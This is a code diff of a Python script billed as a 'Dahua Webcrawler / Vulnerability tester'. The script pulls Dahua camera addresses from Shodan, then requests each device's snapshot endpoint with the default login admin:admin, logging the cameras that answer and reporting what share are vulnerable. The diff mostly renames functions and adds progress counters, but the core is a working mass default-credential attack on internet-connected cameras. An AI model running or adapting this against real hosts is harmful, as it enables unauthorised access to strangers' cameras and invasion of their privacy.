@@ -1,30 +1,30 @@
 import requests
 import shodan
 import argparse
-from pymongo import MongoClient
 from secrets import *
 
 api = shodan.Shodan(SHODAN_API_KEY)
-client = MongoClient(mongodb_key)
-db = client.addresses
 
 iplist = []
 vulnlist = []
 
 parser = argparse.ArgumentParser(description='Dahua Webcrawler / Vulnerability tester')
-parser.add_argument("--c", default=100, type=int, help="Amount of hosts to be audited. Integer input only")
+parser.add_argument("--count", default=100, type=int, help="Amount of hosts to be audited. Integer input only")
 args = parser.parse_args()
-am = args.c
+am = args.count
 
 
 # Make pretty colors :)
-def prRed(skk): print("\033[91m {}\033[00m".format(skk))
+def pryellow(skk): print("\033[93m {}\033[00m".format(skk))
 
 
-def prCyan(skk): print("\033[96m {}\033[00m".format(skk))
+def prred(skk): print("\033[91m {}\033[00m".format(skk))
 
 
-def prGreen(skk): print("\033[92m {}\033[00m".format(skk))
+def prcyan(skk): print("\033[96m {}\033[00m".format(skk))
+
+
+def prgreen(skk): print("\033[92m {}\033[00m".format(skk))
 
 
 # Gets available Dahua Hosts from search query
@@ -58,7 +58,6 @@ def request(link):
     try:
         response = requests.get(link, verify=False, timeout=3)
         if response.status_code == 200:
-            # vulnlist.append(iplist[linklist.index(link)])
             return True
     except:
         return False
@@ -97,21 +96,31 @@ def gendevice():
         filehandle.write('%s\n' % lastline)
 
 
-# main function
+# You know what this does...
+def percentage(vuln, total):
+    try:
+        return (vuln / total) * 100
+    except ZeroDivisionError:
+        return 0
+    return percent
+
+
 def run(amount, query):
     getaddresses(amount, str(query))
     count = 0
     for ip in iplist:
         count += 1
+        perc = ("%.2f" % (percentage(len(vulnlist), count)))
         link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
-        prCyan("trying: " + link)
-        prCyan("Request number: " + count)
+        prcyan("trying: " + link)
+        pryellow("Request number: " + str(count) + " | Amount vulnerable: " + str(len(vulnlist)) + "| Percentage "
+                                                                                                   "vulnerable: " +
+                 str(perc) + "%")
         if request(link):
-            prGreen('Succes!')
+            prgreen('Succes!')
             vulnlist.append(ip)
-            print("Amount vulnerable: " + str.len(vulnlist))
         else:
-            prRed("Fail!")
+            prred("Fail!")
     return vulnlist
     print(save())
 
